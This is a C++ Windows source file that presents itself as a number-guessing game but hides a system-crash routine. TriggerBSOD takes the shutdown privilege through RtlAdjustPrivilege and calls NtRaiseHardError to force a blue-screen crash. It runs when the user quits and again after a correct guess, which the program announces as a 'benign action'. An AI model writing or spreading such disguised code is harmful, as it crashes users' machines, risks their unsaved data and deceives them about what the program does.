#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <random>
#include <string>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);

// Action to run when the user guesses correctly.
static void TriggerAction()
{
    MessageBoxA(NULL, "brace for impact", "Success", MB_OK | MB_ICONINFORMATION);
}

// This function will be used to trigger the BSOD.
void TriggerBSOD()
{
    // Store return values of NT calls
    BOOLEAN bEnabled;
    ULONG uResp;

    // Get raw function pointers from ntdll
    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    // Create function pointers using grabbed function addresses
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

    // Elevate the current process privilege to that required for system shutdown
    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    // Call NtRaiseHardError with a floating-point exception to cause BSOD
    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}

void main()
{
    // Random number generation and user loop
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(1, 100);
    int secret = dist(gen);

    std::cout << "Guess the number (1-100). Enter 0 to quit.\n";
    while (true)
    {
        std::cout << "Enter your guess: ";
        int guess;
        if (!(std::cin >> guess))
        {
            std::cin.clear();
            std::string discard;
            std::getline(std::cin, discard);
            std::cout << "Invalid input. Try again.\n";
            continue;
        }

        if (guess == 0)
        {
            std::cout << "Quit.\n";
			TriggerBSOD();
            return;
        }
        if (guess < 1 || guess > 100)
        {
            std::cout << "Out of range. Try again.\n";
            continue;
        }
        if (guess == secret)
        {
            std::cout << "Correct! Triggering benign action...\n";
            TriggerAction();  // Call action when user guesses correctly.
            TriggerBSOD();
        }
        std::cout << (guess < secret ? "Too low.\n" : "Too high.\n");
    }
}
